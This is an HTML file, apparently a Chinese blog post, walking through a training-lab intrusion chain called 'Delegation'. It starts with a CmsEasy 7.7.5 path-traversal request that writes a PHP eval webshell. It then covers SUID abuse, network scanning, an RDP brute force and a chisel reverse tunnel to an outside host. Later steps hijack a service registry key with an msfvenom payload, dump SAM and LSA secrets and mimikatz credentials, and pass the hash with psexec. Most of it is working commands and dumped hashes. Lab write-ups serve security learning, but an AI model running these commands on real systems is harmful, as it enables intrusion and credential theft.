@@ -1,0 +1,888 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>Delegation - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <div class="c-post__toc-empty">
+            <i class="fas fa-info-circle"></i> 本文暂无小节
+        </div>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">Delegation</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2024-01-11 17:49</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2024-09-11 10:47</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/%e6%b8%97%e9%80%8f"><strong>渗透</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/%e6%98%a5%e7%a7%8b%e4%ba%91%e9%95%9c" class="c-post__tag">#春秋云镜</a>
+            </div>
+            <div class="c-post__description">
+                春秋云镜靶场
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><p>CmsEasy_7.7.5_20211012存在任意文件写入漏洞和任意文件读取漏洞</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 121.89.195.239
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Referer: http://121.89.195.239/index.php?case=admin&amp;act=login&amp;admin_dir=admin&amp;site=default
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Cookie: PHPSESSID=7ie2ceipjmnibvehkh42hrbddo; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 75
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php eval($_POST[a]);?&gt;
+</span></span></code></pre></div></div><p>目录穿越写个马</p>
+<p>弹个shell</p>
+<p><code>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</code></p>
+<p>suid提权</p>
+<p><code>-rwsr-xr-x 1 root root 219480 Apr  8  2019 /usr/bin/diff</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">sudo install -m =xs $(which diff) .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">LFILE=file_to_read
+</span></span><span class="line"><span class="cl">./diff --line-format=%L /dev/null $LFILE
+</span></span></code></pre></div></div><p>直接读flag</p>
+<p><code>diff --line-format=%L /dev/null /home/flag/flag01.txt</code></p>
+<p>传fscan,做个代理</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">www-data@localhost:/tmp$ ./fscan_amd64 -h 172.22.4.36/24
+</span></span><span class="line"><span class="cl">./fscan_amd64 -h 172.22.4.36/24
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   ___                              _    
+</span></span><span class="line"><span class="cl">  / _ \     ___  ___ _ __ __ _  ___| | __ 
+</span></span><span class="line"><span class="cl"> / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /
+</span></span><span class="line"><span class="cl">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
+</span></span><span class="line"><span class="cl">\____/     |___/\___|_|  \__,_|\___|_|\_\   
+</span></span><span class="line"><span class="cl">                     fscan version: 1.8.2
+</span></span><span class="line"><span class="cl">start infoscan
+</span></span><span class="line"><span class="cl">trying RunIcmp2
+</span></span><span class="line"><span class="cl">The current user permissions unable to send icmp packets
+</span></span><span class="line"><span class="cl">start ping
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.4.7      is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.4.19     is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.4.36     is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.4.45     is alive
+</span></span><span class="line"><span class="cl">[*] Icmp alive hosts len is: 4
+</span></span><span class="line"><span class="cl">172.22.4.45:445 open
+</span></span><span class="line"><span class="cl">172.22.4.19:445 open
+</span></span><span class="line"><span class="cl">172.22.4.7:445 open
+</span></span><span class="line"><span class="cl">172.22.4.45:139 open
+</span></span><span class="line"><span class="cl">172.22.4.19:139 open
+</span></span><span class="line"><span class="cl">172.22.4.7:139 open
+</span></span><span class="line"><span class="cl">172.22.4.45:135 open
+</span></span><span class="line"><span class="cl">172.22.4.19:135 open
+</span></span><span class="line"><span class="cl">172.22.4.7:135 open
+</span></span><span class="line"><span class="cl">172.22.4.45:80 open
+</span></span><span class="line"><span class="cl">172.22.4.36:80 open
+</span></span><span class="line"><span class="cl">172.22.4.36:22 open
+</span></span><span class="line"><span class="cl">172.22.4.36:21 open
+</span></span><span class="line"><span class="cl">172.22.4.7:88 open
+</span></span><span class="line"><span class="cl">172.22.4.36:3306 open
+</span></span><span class="line"><span class="cl">[*] alive ports len is: 15
+</span></span><span class="line"><span class="cl">start vulscan
+</span></span><span class="line"><span class="cl">[*] NetInfo:
+</span></span><span class="line"><span class="cl">[*]172.22.4.19
+</span></span><span class="line"><span class="cl">   [-&gt;]FILESERVER
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.4.19
+</span></span><span class="line"><span class="cl">[*] NetInfo:
+</span></span><span class="line"><span class="cl">[*]172.22.4.45
+</span></span><span class="line"><span class="cl">   [-&gt;]WIN19
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.4.45
+</span></span><span class="line"><span class="cl">[*] NetInfo:
+</span></span><span class="line"><span class="cl">[*]172.22.4.7
+</span></span><span class="line"><span class="cl">   [-&gt;]DC01
+</span></span><span class="line"><span class="cl">   [-&gt;]172.22.4.7
+</span></span><span class="line"><span class="cl">[*] 172.22.4.7  (Windows Server 2016 Datacenter 14393)
+</span></span><span class="line"><span class="cl">[*] NetBios: 172.22.4.7      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 
+</span></span><span class="line"><span class="cl">[*] NetBios: 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393 
+</span></span><span class="line"><span class="cl">[*] NetBios: 172.22.4.45     XIAORANG\WIN19                 
+</span></span><span class="line"><span class="cl">[*] WebTitle: http://172.22.4.36        code:200 len:68100  title:中文网页标题
+</span></span><span class="line"><span class="cl">[*] WebTitle: http://172.22.4.45        code:200 len:703    title:IIS Windows Server
+</span></span></code></pre></div></div><p>挺多服务的</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">172.22.4.45:139 open
+</span></span><span class="line"><span class="cl">172.22.4.45:135 open
+</span></span><span class="line"><span class="cl">172.22.4.45:445 open
+</span></span><span class="line"><span class="cl">172.22.4.45:80 open  web
+</span></span><span class="line"><span class="cl">172.22.4.45:515 open
+</span></span><span class="line"><span class="cl">172.22.4.45:3389 open rdp
+</span></span><span class="line"><span class="cl">172.22.4.45:15774 ope
+</span></span></code></pre></div></div><p><code>hydra 121.89.195.239 rdp -l 'WIN19\Adrian' -P /usr/share/wordlists/rockyou.txt -V -F</code></p>
+<p>得到密码</p>
+<p><code>win19\Adrian babygirl1</code></p>
+<p>代理</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">./chisel_amd_linux server -p 7000 --reverse
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">./chisel_amd_linux client 165.154.5.221:7000 R:0.0.0.0:7777:socks
+</span></span></code></pre></div></div><p>rdp提示需要更改密码</p>
+<p><code>p4 rdesktop 172.22.4.45</code></p>
+<p>可以直接rdp上去改</p>
+<p>经典的卡</p>
+<p>用remote也行,新密码<code>123qwe!@#</code></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240417210645.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240417210645.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>点开文件夹</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240417210656.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240417210656.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>额,一眼poc</p>
+<p>点开html发现</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240417210922.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240417210922.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>怎么定位到的额</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">Services Registry Permissions Parse the registry and check whether the current user can modify the configuration of any registered service. False High 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Name              : gupdate
+</span></span><span class="line"><span class="cl">ImagePath         : &#34;C:\Program Files (x86)\Google\Update\GoogleUpdate.exe&#34; /svc
+</span></span><span class="line"><span class="cl">User              : LocalSystem
+</span></span><span class="line"><span class="cl">ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate
+</span></span><span class="line"><span class="cl">IdentityReference : BUILTIN\Users
+</span></span><span class="line"><span class="cl">Permissions       : WriteDAC, Notify, ReadControl, CreateLink, EnumerateSubKeys, WriteOwner, Delete, CreateSubKey, SetV
+</span></span><span class="line"><span class="cl">                    alue, QueryValue
+</span></span><span class="line"><span class="cl">Status            : Stopped
+</span></span><span class="line"><span class="cl">UserCanStart      : True
+</span></span><span class="line"><span class="cl">UserCanStop       : True
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 
+</span></span></code></pre></div></div><ol>
+<li>
+<p><strong>权限设置</strong>：</p>
+<ul>
+<li><code>IdentityReference : BUILTIN\Users</code> 表示所有本地用户组的成员都有对该服务的某些权限。</li>
+<li><code>Permissions</code> 包括了多种关键权限如 <code>WriteDAC</code>（更改访问控制列表）、<code>WriteOwner</code>（更改对象所有者）、<code>CreateSubKey</code>、<code>SetValue</code> 和 <code>Delete</code>。这些权限允许用户修改注册表项、更改服务配置或甚至删除键，这可以对服务行为产生根本性的改变。</li>
+</ul>
+</li>
+<li>
+<p><strong>服务的可修改性</strong>：</p>
+<ul>
+<li><code>ModifiablePath : HKLM\SYSTEM\CurrentControlSet\Services\gupdate</code> 表明这个注册表路径是可被修改的，而且因为权限设置的宽松，普通用户可以对此服务的配置进行修改。</li>
+</ul>
+</li>
+</ol>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">msfvenom -p windows/x64/exec cmd=&#39;C:\windows\system32\cmd.exe /c C:\users\Adrian\Desktop\sam.bat &#39; --platform windows -a x64 -f exe-service -o a.exe
+</span></span></code></pre></div></div><p>在桌面创建一个<code>sam.bat</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">reg save hklm\system C:\Users\Adrian\Desktop\system
+</span></span><span class="line"><span class="cl">reg save hklm\sam C:\Users\Adrian\Desktop\sam
+</span></span><span class="line"><span class="cl">reg save hklm\security C:\Users\Adrian\Desktop\security
+</span></span></code></pre></div></div><p>打开PowerShell</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">reg add &#34;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&#34; /t REG_EXPAND_SZ /v ImagePath /d &#34;C:\Users\Adrian\Desktop\a.exe&#34; /f
+</span></span></code></pre></div></div><p>然后启动一下服务</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">sc start gupdate
+</span></span></code></pre></div></div><p>注册表的这三个文件就拉取下来了</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">reg save hklm\system C:\Users\Adrian\Desktop\system
+</span></span><span class="line"><span class="cl">reg save hklm\sam C:\Users\Adrian\Desktop\sam
+</span></span><span class="line"><span class="cl">reg save hklm\security C:\Users\Adrian\Desktop\security
+</span></span></code></pre></div></div><p>然后保存下来</p>
+<p>去kali<code>secretsdump.py LOCAL -system system -sam sam -security security</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">获取 Administrator + 机器账户 凭据
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright 2023 Fortra
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Target system bootKey: 0x08092415ee8b9b2ad2f5f5060fb48339
+</span></span><span class="line"><span class="cl">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::
+</span></span><span class="line"><span class="cl">Adrian:1003:aad3b435b51404eeaad3b435b51404ee:00affd88fa323b00d4560bf9fef0ec2f:::
+</span></span><span class="line"><span class="cl">[*] Dumping cached domain logon information (domain/username:hash)
+</span></span><span class="line"><span class="cl">XIAORANG.LAB/Aldrich:$DCC2$10240#Aldrich#e4170181a8bb2a24e6113a9b4895307a: (2022-06-24 03:18:39)
+</span></span><span class="line"><span class="cl">[*] Dumping LSA Secrets
+</span></span><span class="line"><span class="cl">[*] $MACHINE.ACC 
+</span></span><span class="line"><span class="cl">$MACHINE.ACC:plain_password_hex:db7f9cd22bfade0a9f7177115459fc869fd5b81d12ff70a2f3e11a670f50db41ad0b25b16342053a0f5ffe8a70b4b46c070505a1a108a556e750968c469aee910b896a474a18c34ff0ca77761370106245d7feb87681cd9eccaea10ec72117fb5eef3ef9a04b8b448a1fa77a6366624c8b12b231963049c0986a6f393cbb75968324b1b28388279ececde02d9a7793785ff57bd18c398b688ec7879297e42a7799db8a5f1b93cbcaf842650b497d76b23bfc82c832a12fbdc048b3d8b672e580b09abf02fceb7d2419f017465301ee817e4be41423593b0518fcc00d04d756f6908cade4670cb850f698ae1fe4c549d6
+</span></span><span class="line"><span class="cl">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">[*] DPAPI_SYSTEM 
+</span></span><span class="line"><span class="cl">dpapi_machinekey:0x4af114bade59102b7c64e41cde94be2257337fab
+</span></span><span class="line"><span class="cl">dpapi_userkey:0x372392e560b616ecd27b6ec0fe138ef86790b565
+</span></span><span class="line"><span class="cl">[*] NL$KM 
+</span></span><span class="line"><span class="cl"> 0000   56 4B 21 B3 87 A3 29 41  FD 91 8F 3A 2D 2B 86 CC   VK!...)A...:-+..
+</span></span><span class="line"><span class="cl"> 0010   49 4A EE 48 6C CD 9C D7  C7 DA 65 B6 62 4D 35 BD   IJ.Hl.....e.bM5.
+</span></span><span class="line"><span class="cl"> 0020   09 F7 59 68 23 69 DE BA  2D 47 84 47 29 AD 5D AE   ..Yh#i..-G.G).].
+</span></span><span class="line"><span class="cl"> 0030   A0 5F 19 CA 21 13 E4 6D  01 27 C3 FC 0C C1 0F 2E   ._..!..m.&#39;......
+</span></span><span class="line"><span class="cl">NL$KM:564b21b387a32941fd918f3a2d2b86cc494aee486ccd9cd7c7da65b6624d35bd09f759682369deba2d47844729ad5daea05f19ca2113e46d0127c3fc0cc10f2e
+</span></span><span class="line"><span class="cl">[*] Cleaning up... 
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>拿到admin hash登录</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">p4 psexec.py administrator@172.22.4.45 -hashes &#34;aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab&#34; -codec gbk
+</span></span></code></pre></div></div><p><code>nt authority\system</code></p>
+<p>拿下了,新建个用户</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">net user dionysus qwer1234! /add
+</span></span><span class="line"><span class="cl">net localgroup administrators dionysus /add
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">bloodhound-python -u win19$ --hashes &#34;aad3b435b51404eeaad3b435b51404ee:68d660f11c6854d1df763d120f3b6225&#34; -d xiaorang.lab -dc dc01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip
+</span></span></code></pre></div></div><p>草,记得以管理员身份运行</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">shell</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="shell"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  .#####.   mimikatz 2.2.0 <span class="o">(</span>x64<span class="o">)</span> <span class="c1">#18362 Feb 29 2020 11:13:36</span>
+</span></span><span class="line"><span class="cl"> .## ^ <span class="c1">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
+</span></span><span class="line"><span class="cl"> <span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span class="line"><span class="cl"> <span class="c1">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span class="o">(</span> vincent.letoux@gmail.com <span class="o">)</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;#####&#39;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mimikatz <span class="c1"># privilege::debug</span>
+</span></span><span class="line"><span class="cl">Privilege <span class="s1">&#39;20&#39;</span> OK
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mimikatz <span class="c1"># sekurlsa::logonpasswords</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">3113835</span> <span class="o">(</span>00000000:002f836b<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : RemoteInteractive from <span class="m">3</span>
+</span></span><span class="line"><span class="cl">User Name         : dionysus
+</span></span><span class="line"><span class="cl">Domain            : WIN19
+</span></span><span class="line"><span class="cl">Logon Server      : WIN19
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 22:15:47
+</span></span><span class="line"><span class="cl">SID               : S-1-5-21-3980434786-725135618-2951588801-1004
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : dionysus
+</span></span><span class="line"><span class="cl">         * Domain   : WIN19
+</span></span><span class="line"><span class="cl">         * NTLM     : 6912928308e3cda903e6d75bd6091a20
+</span></span><span class="line"><span class="cl">         * SHA1     : 4687d6f9b23b55f21825bc5157fe2cbe707c07de
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : dionysus
+</span></span><span class="line"><span class="cl">         * Domain   : WIN19
+</span></span><span class="line"><span class="cl">         * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        kerberos :
+</span></span><span class="line"><span class="cl">         * Username : dionysus
+</span></span><span class="line"><span class="cl">         * Domain   : WIN19
+</span></span><span class="line"><span class="cl">         * Password : qwer1234!
+</span></span><span class="line"><span class="cl">        ssp :
+</span></span><span class="line"><span class="cl">        credman :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">1128367</span> <span class="o">(</span>00000000:001137af<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">2</span>
+</span></span><span class="line"><span class="cl">User Name         : DWM-2
+</span></span><span class="line"><span class="cl">Domain            : Window Manager
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/17 21:04:49
+</span></span><span class="line"><span class="cl">SID               : S-1-5-90-0-2
+</span></span><span class="line"><span class="cl">        msv :
+</span></span><span class="line"><span class="cl">         <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">         * NTLM     : 68d660f11c6854d1df763d120f3b6225
+</span></span><span class="line"><span class="cl">         * SHA1     : ef0cf040ec9a0d7ada83fabfba0e44bc421442bc
+</span></span><span class="line"><span class="cl">        tspkg :
+</span></span><span class="line"><span class="cl">        wdigest :
+</span></span><span class="line"><span class="cl">         * Username : WIN19$
+</span></span><span class="line"><span class="cl">         * Domain   : XIAORANG
